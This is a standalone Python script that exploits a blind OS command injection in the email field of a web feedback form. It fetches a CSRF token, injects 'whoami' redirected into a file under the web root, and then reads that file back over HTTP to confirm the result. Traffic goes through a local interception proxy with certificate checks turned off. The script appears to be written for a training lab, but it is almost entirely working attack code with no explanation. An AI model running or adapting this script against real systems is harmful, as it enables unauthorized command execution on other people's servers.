import requests
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(session, url):
    feedback_path = "/feedback"
    res = session.get(url + feedback_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf = soup.find("input")["value"]
    return csrf

def exploit_command_injection(session, url):
    submit_feedback_path = "/feedback/submit"
    command_payload = "test@test.ca & whoami > /var/www/images/hack1.txt #"
    csrf_token = get_csrf_token(session, url)
    params = {'csrf': csrf_token, 'name': 'test', 'email': command_payload, 'subject': 'test', 'message': 'test'}
    res = session.post(url + submit_feedback_path, data=params, verify=False, proxies=proxies)

    print("[+] Verifying if command injection exploit worked...")
    # Verifying command injection
    file_path = "/image?filename=hack1.txt"
    res1 = session.get(url + file_path, verify=False, proxies=proxies)
    if res1.status_code == 200:
        print("[+] Command injection successful...")
        print("[+] The following is the content of the command: " + res1.text)
    else:
        print("[-] Command injection was not successful...")

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: python {sys.argv[0]} <url>")
        print(f"[+] Example: python {sys.argv[0]} www.example.com")
        sys.exit(-1)

    url = sys.argv[1].strip()
    print("[+] Exploiting blind command injection in email field...")
    session = requests.session()
    exploit_command_injection(session, url)
    
if __name__ == "__main__":
    main()